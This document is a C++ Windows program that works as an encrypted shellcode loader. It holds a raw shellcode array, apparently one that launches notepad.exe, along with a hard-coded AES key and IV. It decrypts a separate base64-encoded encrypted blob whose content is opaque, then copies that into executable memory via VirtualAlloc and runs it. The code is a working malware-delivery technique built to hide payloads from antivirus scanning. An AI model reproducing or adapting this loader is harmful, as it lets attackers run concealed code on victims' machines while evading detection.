#include <iostream>
#include <Windows.h>
#include <wincrypt.h>
#include <string>
#include <stdio.h>
#include <bcrypt.h>
#include "crypto.h"
#include "base64.h"

#define ENCRYPT_ALGORITHM CALG_AES_256
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)
#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
using namespace std;


int main()
{
    crypto c = crypto();
    base64 b = base64();
    DWORD procID;
    unsigned char shellcode[] =
        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
        "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
        "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
        "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
        "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
        "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
        "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
        "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
        "\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
        "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
        "\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
        "\x00\x53\xff\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65"
        "\x00";

    BYTE IV[] = { 0x89,0x54,0x7f,0x64,0xc0,0xce,0x3a,0x44,0xf0,0xee,0xaf,0x1,0xa8,0xdc,0x6b,0x65 };
    BYTE KEY[] = { 0x70,0x76,0x20,0xf2,0x3f,0x4c,0x4c,0x10,0x45,0xfb,0x50,0x93,0xd8,0xd1,0xc9,0xfb,0x6c,0x30,0x45,0x88,0xdd,0xb2,0xf4,0xaf,0x9c,0x1c,0x22,0x13,0x26,0x67,0x24,0xbd };

    // Encrypt
    std::pair<DWORD, PBYTE> e = c.encrypt(shellcode, sizeof(shellcode), IV, sizeof(IV), KEY, sizeof(KEY));
    DWORD cbCipherText = e.first;
    PBYTE pbCipherText = e.second;

    for (int i = 0; i <= cbCipherText; i++)
    {
        printf("%x", pbCipherText[i]);
    }
    cout << "\n" << endl;

    std::string encoded = b.base64_encode(pbCipherText, cbCipherText);
    printf("Encoded %s\n\n", encoded.data());


    std::string encoded_data = "0IroXrM0Z6tV2HjAmzWYmrFkwEir6SklsEIXYUmdhWeP0LW9NOtPCZfWKCRW5VSRWuluNSnyUR6gYaKQYxrDCRcsUIY+JtJuVTl+Qngo33DwBanZsdzJMZCtYLINz14hxQw5rKJyG5OVEQyYj1/fmuEMb64jLpmHxROmxEOn+tH9sb3QG/vy1xKpRFdcE7/U47oEeVlhdX/tti89U69f7LK7n0k5Eh4eUMImAX4na6NxgyyywtwImmRwHWaWEAGGPrCFlgQLaP6fPMAxC46hNjwjFTuvA7sho2QVMn2OIoBlXP6HKMkj0yb8zmEYZ4D2n2FupRn+y2zqSPH9YMArFHddWVbXlFOAJPoqjjPV3Q7Myu5tYpZpm+D1PPZYRkJgYrwv/lWBoO1+FI80ItYHUmRhMJl5V5gLeAiyDUO8KqXSOWbFhX3NG3Bs514ks7fZI6BNnDnzoYdiqvGtNx45pvKAKUcb/xsYt633QD5Bs6xec1TfYKs1UVPORG9PCtnLjYw/WyEtE8kxxzsiVmGVbg4FChy0xuEzokckQZ6cZD7TNeuSosk1rsCtzu+ll/95/EmG/z3A+t4hsrdbYqC1j+V//JefIjJ+zYghLmN8VdN82DrTtYKmfb9JASBci1TF/E9bTTGwYIvK+mDLaA7yk6kLBE62aFeRldPgY8w4eaw=";
    std::string decoded_data = b.base64_decode(encoded_data);
    char const* aa = decoded_data.c_str();
    DWORD size = decoded_data.length();

    // Decrypt
    std::pair<DWORD, PBYTE> d = c.decrypt(IV, sizeof(IV), KEY, sizeof(KEY), size, (PBYTE)aa);
    DWORD cbPlainText = d.first;
    PBYTE pbPlainText = d.second;

    printf("Decrypted Data\n");
    for (int i = 0; i <= cbPlainText; i++)
    {
        printf("%x", pbPlainText[i]);
    }
    cout << "\n" << endl;


    // Shellcode Execution
    LPVOID sik = VirtualAlloc(0, cbPlainText, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(sik, pbPlainText, cbPlainText);
    VirtualProtect(sik, cbPlainText, PAGE_EXECUTE, &procID);
    int(*f)() = (int(*)()) sik;
    f();


    return 0;
}

